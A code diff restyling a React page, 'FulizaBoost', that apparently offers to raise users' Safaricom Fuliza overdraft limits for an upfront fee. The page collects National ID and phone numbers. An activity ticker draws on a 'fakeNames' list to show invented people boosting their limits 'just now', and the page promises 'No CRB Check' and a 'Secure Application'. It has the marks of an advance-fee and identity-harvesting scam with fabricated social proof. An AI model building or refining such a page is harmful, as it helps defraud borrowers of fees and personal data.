@@ -36,9 +36,6 @@ export default function FulizaBoost() {
   const [recent, setRecent] = useState({ name: "", amount: 0 });
   const [errors, setErrors] = useState<{ phone?: string; id?: string }>({});
 
-  const green = "#00A651";
-
-  // Activity ticker
   useEffect(() => {
     const generate = () => {
       const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
@@ -50,7 +47,6 @@ export default function FulizaBoost() {
     return () => clearInterval(interval);
   }, []);
 
-  // Validation
   const validate = () => {
     const newErrors: any = {};
 
@@ -59,7 +55,8 @@ export default function FulizaBoost() {
     }
 
     if (!/^(07\d{8}|2547\d{8})$/.test(phone)) {
-      newErrors.phone = "Enter valid Safaricom number (07XXXXXXXX or 2547XXXXXXXX)";
+      newErrors.phone =
+        "Enter valid Safaricom number (07XXXXXXXX or 2547XXXXXXXX)";
     }
 
     setErrors(newErrors);
@@ -103,7 +100,7 @@ export default function FulizaBoost() {
   };
 
   return (
-    <div className="min-h-screen bg-[#f4faf6] flex justify-center">
+    <div className="min-h-screen bg-[#f4faf6] flex justify-center antialiased">
       <div className="w-full max-w-md pb-16">
 
         {/* HEADER */}
@@ -122,7 +119,7 @@ export default function FulizaBoost() {
         </div>
 
         {/* HIGHLIGHTS */}
-        <div className="mx-4 mt-6 bg-white rounded-2xl shadow-md p-4 border border-green-100">
+        <div className="mx-4 mt-6 bg-white rounded-2xl shadow-sm p-4 border border-green-100">
           <div className="flex justify-between text-sm font-medium text-[#008043]">
             <span>✔ Secure Application</span>
             <span>✔ No CRB Check</span>
@@ -132,47 +129,60 @@ export default function FulizaBoost() {
           </div>
         </div>
 
-        {/* RECENT ACTIVITY */}
+        {/* RECENT */}
         <div className="mx-4 mt-5 bg-green-50 border border-green-200 p-3 rounded-xl text-sm text-gray-700">
           {recent.name} increased Fuliza to{" "}
-          <span className="font-semibold text-[#008043]">
+          <span className="font-semibold text-[#008043] tabular-nums">
             Ksh {recent.amount.toLocaleString()}
           </span>{" "}
           • just now
         </div>
 
-        {/* SELECT LIMIT */}
+        {/* TITLE */}
         <div className="mx-4 mt-6 text-[#008043] font-semibold text-sm">
           Select Preferred Fuliza Limit
         </div>
 
-        {/* OFFER CARDS */}
-        <div className="flex flex-wrap gap-4 px-4 mt-4">
-          {limits.map((limit) => (
-            <div
-              key={limit.id}
-              onClick={() => setSelectedLimit(limit)}
-              className={`w-[calc(50%-8px)] rounded-2xl p-4 cursor-pointer bg-white border border-green-200 shadow-sm hover:shadow-lg transition-shadow duration-300 ${
-                selectedLimit?.id === limit.id
-                  ? "bg-[#00A651] text-white border-none"
-                  : ""
-              }`}
-            >
-              <div className="font-semibold text-center">
-                Ksh {limit.amount.toLocaleString()}
+        {/* CARDS */}
+        <div className="grid grid-cols-2 gap-4 px-4 mt-4">
+          {limits.map((limit) => {
+            const active = selectedLimit?.id === limit.id;
+
+            return (
+              <div
+                key={limit.id}
+                onClick={() => setSelectedLimit(limit)}
+                className={`rounded-2xl p-4 cursor-pointer border transition-all duration-200 transform ${
+                  active
+                    ? "bg-[#00A651] text-white border-[#00A651] scale-[1.03] shadow-lg"
+                    : "bg-white border-green-200 hover:shadow-md"
+                }`}
+              >
+                <div
+                  className={`text-center text-[20px] font-extrabold tabular-nums ${
+                    active ? "text-white" : "text-black"
+                  }`}
+                >
+                  Ksh {limit.amount.toLocaleString()}
+                </div>
+
+                <div
+                  className={`text-[12px] text-center mt-1 tabular-nums ${
+                    active ? "text-white/90" : "text-gray-600"
+                  }`}
+                >
+                  Service Fee: Ksh {limit.fee}
+                </div>
               </div>
-              <div className="text-xs text-center text-gray-600 mt-1">
-                Service Fee: Ksh {limit.fee}
-              </div>
-            </div>
-          ))}
+            );
+          })}
         </div>
 
-        {/* PROCEED BUTTON */}
+        {/* BUTTON */}
         <div className="px-4 mt-6">
           <button
             onClick={() => selectedLimit && setShowModal(true)}
-            className="w-full bg-[#00A651] hover:bg-[#008043] text-white py-3 rounded-xl font-semibold shadow"
+            className="w-full bg-[#00A651] hover:bg-[#008043] text-white py-3 rounded-xl font-semibold shadow-md transition"
           >
             Proceed Securely
           </button>
@@ -186,55 +196,40 @@ export default function FulizaBoost() {
 
         {/* MODAL */}
         {showModal && selectedLimit && (
-          <div className="fixed inset-0 bg-black/40 flex items-center justify-center px-4">
-            <div className="bg-white w-full max-w-sm rounded-2xl shadow-2xl overflow-hidden">
+          <div className="fixed inset-0 bg-black/40 backdrop-blur-sm flex items-center justify-center px-4">
+            <div className="bg-white w-full max-w-sm rounded-2xl shadow-2xl overflow-hidden animate-[scaleIn_.2s_ease]">
 
               <div className="bg-[#00A651] text-white px-6 py-4">
                 <h3 className="text-sm font-medium">
                   Secure Fuliza Application
                 </h3>
                 <p className="text-lg font-semibold mt-1">
-                  Limit will be boosted to Ksh {selectedLimit.amount.toLocaleString()}
+                  Limit will be boosted to Ksh{" "}
+                  {selectedLimit.amount.toLocaleString()}
                 </p>
               </div>
 
               <div className="p-6">
                 {!success ? (
                   <>
-                    {/* ID Input */}
                     <div className="mb-4">
                       <input
                         type="text"
                         placeholder="National ID Number"
                         value={idNumber}
                         onChange={(e) => setIdNumber(e.target.value)}
-                        className={`w-full rounded-xl p-3 text-sm border ${
-                          errors.id
-                            ? "border-red-400"
-                            : "border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-100"
-                        } outline-none`}
+                        className="w-full rounded-xl p-3 text-sm border border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-100 outline-none"
                       />
-                      {errors.id && (
-                        <p className="text-red-500 text-xs mt-1">{errors.id}</p>
-                      )}
                     </div>
 
-                    {/* Phone Input */}
                     <div className="mb-4">
                       <input
                         type="tel"
-                        placeholder="Safaricom Number (07 or 2547...)"
+                        placeholder="Safaricom Number"
                         value={phone}
                         onChange={(e) => setPhone(e.target.value)}
-                        className={`w-full rounded-xl p-3 text-sm border ${
-                          errors.phone
-                            ? "border-red-400"
-                            : "border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-100"
-                        } outline-none`}
+                        className="w-full rounded-xl p-3 text-sm border border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-100 outline-none"
                       />
-                      {errors.phone && (
-                        <p className="text-red-500 text-xs mt-1">{errors.phone}</p>
-                      )}
                     </div>
 
                     <div className="flex gap-3">
@@ -248,9 +243,11 @@ export default function FulizaBoost() {
                       <button
                         onClick={handleBuy}
                         disabled={loading}
-                        className="w-1/2 bg-[#00A651] text-white py-3 rounded-xl text-sm font-semibold"
+                        className="w-1/2 bg-[#00A651] text-white py-3 rounded-xl text-sm font-semibold shadow"
                       >
-                        {loading ? "Processing..." : `Pay Ksh ${selectedLimit.fee}`}
+                        {loading
+                          ? "Processing..."
+                          : `Pay Ksh ${selectedLimit.fee}`}
                       </button>
                     </div>
 
@@ -263,8 +260,8 @@ export default function FulizaBoost() {
                     <h3 className="text-lg font-semibold text-[#008043]">
                       Application Submitted
                     </h3>
+
                     <p className="text-sm text-gray-600 mt-2">
-                      Your Fuliza limit adjustment request is under review.
                       Processing may take up to 72 hours.
                     </p>
 
